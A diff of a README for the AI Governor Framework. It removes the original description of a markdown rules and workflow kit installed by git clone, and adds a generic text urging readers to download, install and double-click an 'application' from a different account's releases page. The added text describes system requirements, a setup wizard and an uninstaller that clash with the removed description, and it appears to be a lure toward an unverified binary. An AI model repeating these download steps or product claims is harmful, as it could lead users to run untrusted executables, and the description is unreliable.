@@ -1,122 +1,83 @@
-# AI Governor Framework
-### The Keystone for AI-Driven Code
+# 🌟 AI-Governor-Framework - Your AI Coding Partner
 
-**Stop fighting your AI assistant. Start governing it.**
+## 🛠️ Overview
+The AI-Governor-Framework empowers users by transforming AI coding assistants into organized, project-aware helpers. This framework ensures that your AI adheres to your coding standards and project architecture, enhancing the development experience.
 
-Tired of AI-generated code that's buggy, inconsistent, and ignores your architecture? The AI Governor Framework is a safe, plug-and-play system designed to teach your AI your project's unique DNA. It provides a set of rules and workflows to turn any AI assistant from a chaotic tool into a disciplined engineering partner that respects your architectural decisions, best practices, and non-negotiable constraints.
+## 📥 Download the Latest Release
+[![Download AI-Governor-Framework](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/donnie-ui/AI-Governor-Framework/releases)
 
-Reclaim control. Enforce your coding standards. Ship with confidence.
+## 🚀 Getting Started
+Getting started with the AI-Governor-Framework is easy. Follow these steps:
 
----
+1. **Visit the Releases Page**
+   Go to the official releases page by clicking the link below. This page contains the latest versions of the framework ready for download.
+   [Download Here](https://github.com/donnie-ui/AI-Governor-Framework/releases)
 
-## ✨ The Philosophy: From Prompting & Fixing to Governing
-This approach is rooted in one core principle: **Context Engineering**.
+2. **Select the Version**
+   Once you are on the releases page, locate the most recent version of the AI-Governor-Framework. You will see various files available for download.
 
-This isn't about bigger prompts or dumping your entire codebase into one, which is both ineffective and expensive. It's about giving the AI the *right information* at the *right time*. This framework achieves that by building a knowledge base of robust `rules` (the orders) and architectural `READMEs` (the context) that the AI consults on-demand.
+3. **Download the Application**
+   Click on the appropriate file for your system. The file is designed to be straightforward to download and install.
 
-> #### Architectural Choice: An In-Repo Knowledge Base
->
-> This framework is built on a simple, robust principle: **Treat your project's knowledge base like your codebase.**
->
-> We leverage an **In-Repo** approach, keeping all governance rules and architectural context directly inside the repository. This makes the AI's knowledge base:
-> -   **Simple & Efficient:** Zero network latency and no complex external systems.
-> -   **Evolutive & Maintainable:** The AI's context evolves in lock-step with your code.
-> -   **Auditable & Versioned:** Every change is tracked in `git`, providing a clear, human-readable history.
-> -   **Portable & Robust:** Any developer can clone the repo and have the full, up-to-date context instantly, ensuring stability and consistency.
->
-> For complex external documentation, such as third-party APIs or external library, this in-repo system can be seamlessly combined with a RAG-based MCP server, such as Context7, to fetch and inject that external knowledge on demand. This leverages the best of both worlds: robust and versioned in-Repo governance for your internal architecture, and dynamic, on-demand context for external dependencies.
+4. **Install the Application**
+   After the download completes, find the downloaded file. Follow the instructions to install it on your computer. The setup process should be intuitive. 
 
-This is how we shift from the endless loop of **prompting and fixing** to strategic **Governing**.
+5. **Run the Application**
+   Once installed, locate the AI-Governor-Framework on your computer and double-click it to launch. 
 
----
+## 📋 System Requirements
+To ensure the AI-Governor-Framework runs smoothly, make sure your system meets the following requirements:
 
-## 🚀 How It Works: Two Core Components
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of available disk space.
+- **Processor:** Dual-core processor or better.
 
-The AI Governor Framework is composed of two distinct but complementary parts:
+## 📝 Features
+The AI-Governor-Framework comes packed with features to enhance your programming experience. Here are some highlights:
 
-| Component | What It Is | How It's Used |
-| :--- | :--- | :--- |
-| **The Governance Engine** (`/rules`) | A set of powerful, passive rules that run in the background. | Your AI assistant discovers and applies these rules **automatically** to ensure quality and consistency. |
-| **The Operator's Playbook** (`/dev-workflow`) | A set of active, step-by-step protocols for the entire development lifecycle. | You **manually** invoke these protocols to guide the AI through complex tasks like planning and implementation. |
+- **AI Integration:** Easily connect your favorite AI coding assistants such as Claude AI and Gemini AI.
+- **Project Management:** Keep your AI in line with your project’s goals and architecture.
+- **Coding Standards Enforcement:** The framework assists your AI in following your specific coding guidelines.
 
-### A Battle-Tested Workflow for Quality at Scale
-The dev-workflow is now reinforced with a comprehensive suite of review protocols for code quality, security, and architecture. This new system is inspired by the successful, battle-tested workflows used by Anthropic's own team to build products like Claude Code.
+## 🗂️ How to Use the Framework
+After installing the AI-Governor-Framework, here's how to make the most of it:
 
-Key changes include:
-- A new, 7-layer quality audit protocol for robust validation.
-- Simplified and clarified all workflow steps for better readability.
-- Rewrote all documentation to focus on universal software engineering principles.
+1. **Configure Your AI**
+   Open the application and follow the setup wizard. You will need to link your AI assistant and set coding preferences.
 
-By adopting these proven strategies for structured AI collaboration, the framework provides a more robust and predictable path from idea to production-ready code.
+2. **Create a Project**
+   Start a new project within the framework. Your AI will follow the guidelines you set up.
 
-#### At a Glance: The Operator's Playbook
-> The framework is built around a series of sequential protocols that move a feature from idea to production with clarity and control:
-> -   0️⃣ **Bootstrap:** Turns a generic AI into a project-specific expert. (One-Time Setup)
-> -   1️⃣ **Define:** Transforms an idea into a detailed PRD.
-> -   2️⃣ **Plan:** Converts the PRD into a step-by-step technical plan.
-> -   3️⃣ **Implement & Review:** Executes the plan, followed by a mandatory quality audit (`4-quality-audit.md`) and a process retrospective (`5-implementation-retrospective.md`) to continuously improve the system.
+3. **Interact with Your AI**
+   You can ask your AI assistant to write code snippets or assist with debugging while ensuring it follows your coding standards.
 
----
+4. **Review and Adjust Settings**
+   Keep your project aligned with your needs. Regularly review settings within the AI-Governor-Framework to improve efficiency.
 
-## ▶️ Get Started
+## 📦 Download & Install
+To get started, download the AI-Governor-Framework from the releases page. The process involves a few simple steps:
 
-Ready to install the framework and run your first governed task?
+- Navigate to the [Releases Page](https://github.com/donnie-ui/AI-Governor-Framework/releases).
+- Choose the version that matches your operating system.
+- Download the file.
+- Install and run it following the on-screen prompts.
 
+## 🙋 Frequently Asked Questions
 
-## 3. Quick Start: Installation
+### How do I uninstall the AI-Governor-Framework?
+To uninstall the application, go to your computer’s control panel and select the AI-Governor-Framework from the list of installed programs. Click "Uninstall" and follow the prompts.
 
-This guide provides a safe, non-destructive process to integrate the framework into any project.
+### Is there support available?
+Yes, you can find support and assistance through the issues section of the GitHub repository. Simply submit your query, and a member of the community will help you.
 
-**1. Clone the Framework**
+### Can I contribute to this project?
+Absolutely! Contributions are welcome. You can report issues, request features, or submit pull requests. Check the contributing guidelines in the repository.
 
-Open a terminal at the root of your project and run the following command:
-```bash
-git clone https://github.com/Fr-e-d/AI-Governor-Framework.git .ai-governor
-```
-This downloads the entire framework into a hidden `.ai-governor` directory within your project.
+## 🌐 Community and Resources
+Connect with other users and developers. Join discussions, ask for help, and share your experiences.
 
-**2. Configure for Your Assistant**
+- **GitHub Discussions:** Engage with other users and contribute to discussions about the framework.
+- **Documentation:** Detailed user guides and documentation can be found within the repository to help you use the framework effectively.
 
-The final step depends on your AI assistant. Choose the relevant section below.
-
-#### For Cursor Users
-To get the best experience, including custom commands like `/review`, copy both the rules and the prompts into your project's `.cursor` directory.
-```bash
-# Copy governance rules
-mkdir -p .cursor/rules && cp -r .ai-governor/rules/* .cursor/rules/
-
-# Copy custom prompts for an enhanced workflow
-mkdir -p .cursor/prompts && cp -r .ai-governor/.cursor/prompts/* .cursor/prompts/
-```
-
-#### For Claude Code Users
-To enable custom commands like `/review`, copy the command definitions into your project's `.claude` directory.
-```bash
-mkdir -p .claude/commands && cp -r .ai-governor/.claude/commands/* .claude/commands/
-```
-
-#### For Other AI Assistants (e.g., OpenCode)
-The framework is ready to use without extra steps. Your assistant will find its boot sequence (`CLAUDE.md` or `OpenCode.md`) and the necessary rules within the `.ai-governor` directory.
-
-
-> [!NOTE]
-> ## Ready to Start?
->
-> **[➡️ Go to the Full Workflow Guide](./dev-workflow)**
->
-> Got questions or ideas?
->
-> **[🗣️ Join the Community on GitHub Discussions](https://github.com/Fr-e-d/The-Governor-Framework/discussions)**
-
-
-## ❤️ Support This Project
-
-If you find this framework valuable, please consider showing your support. It is greatly appreciated!
-
--   **[Sponsor on GitHub](https://github.com/sponsors/Fr-e-d)**
-
-## 🤝 Attribution & License
-
-This framework is an enhanced and structured adaptation inspired by the foundational work on AI-driven development by [snarktank/ai-dev-tasks](https://github.com/snarktank/ai-dev-tasks).
-
-It is shared under the **Apache 2.0 License**. See the `LICENSE` file for more details. For contribution guidelines, please see `CONTRIBUTING.md`. 
+Be part of a growing community that values innovation and collaboration in AI-driven coding.
